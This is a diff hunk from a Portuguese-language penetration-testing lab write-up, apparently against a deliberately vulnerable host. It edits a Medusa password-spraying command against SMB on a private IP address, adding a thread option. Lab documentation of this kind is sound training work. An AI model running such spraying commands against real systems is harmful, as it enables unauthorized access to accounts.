@@ -118,7 +118,7 @@ Com os usuários mapeados (`root`, `msfadmin`, `user`, `service`, `postgres`, et
 ### 3. Execução do Password Spraying com Medusa
 Utilizou-se o módulo `smbnt` nas portas de rede SMB (139/445):
 ```bash
-medusa -h 192.168.65.128 -U smb_usuarios.txt -P spray.txt -M smbnt -t 2
+medusa -h 192.168.65.128 -U smb_usuarios.txt -P spray.txt -M smbnt -t 2 -T 50
 ```
 
 **Resultado Crítico:**
